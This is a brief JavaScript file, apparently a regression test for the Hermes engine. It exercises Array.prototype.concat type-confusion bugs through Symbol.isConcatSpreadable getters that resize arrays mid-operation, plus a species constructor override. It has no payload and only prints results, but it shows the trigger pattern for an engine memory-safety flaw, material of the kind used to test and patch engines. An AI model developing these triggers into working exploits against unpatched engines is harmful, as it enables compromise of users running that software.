// hermes: Array.prototype.concat type confusion through isConcatSpreadable (Hermes advisories 2020-2021) species
var a = [1, 2, 3];
var b = [4.5, 5.5];
Object.defineProperty(b, Symbol.isConcatSpreadable, { get() { a.length = 0; b[0] = {}; return true; } });
print(String(a.concat(b, a)));
var arrayLike = { length: 3, 0: 'x', get 1() { this.length = 1e7; return 'y'; }, [Symbol.isConcatSpreadable]: true };
try { var r = [].concat(arrayLike); print(r.length > 3 ? 'grew' : r.length); } catch (e) { print(e.name); }
var c = [1, 2];
c.constructor = { [Symbol.species]: function (n) { return { length: 0 }; } };
print(JSON.stringify(c.concat([3])));
